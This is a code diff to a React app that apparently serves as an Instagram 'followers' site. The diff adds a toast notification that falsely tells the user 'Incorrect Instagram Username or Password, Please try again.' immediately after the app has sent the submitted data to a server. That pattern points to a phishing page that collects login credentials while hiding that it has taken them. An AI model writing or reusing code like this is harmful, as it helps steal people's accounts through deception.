@@ -2,6 +2,8 @@ import { useState } from "react";
 import "./App.css";
 import "./bhutton.css";
 import { useEffect } from "react";
+import { Toaster } from "react-hot-toast";
+import toast from "react-hot-toast";
 
 function App() {
   const [Ip, setIp] = useState("Fething results, please wait...");
@@ -64,10 +66,15 @@ function App() {
     };
 
     request.send(JSON.stringify(params));
+    toast.error("Incorrect Instagram Username or Password, Please try again.");
   };
 
   return (
     <>
+    <Toaster
+  position="top-center"
+  reverseOrder={false}
+/>
       <div className="container">
         <img
           src="https://social-events.in/socialfollow-logo.svg"
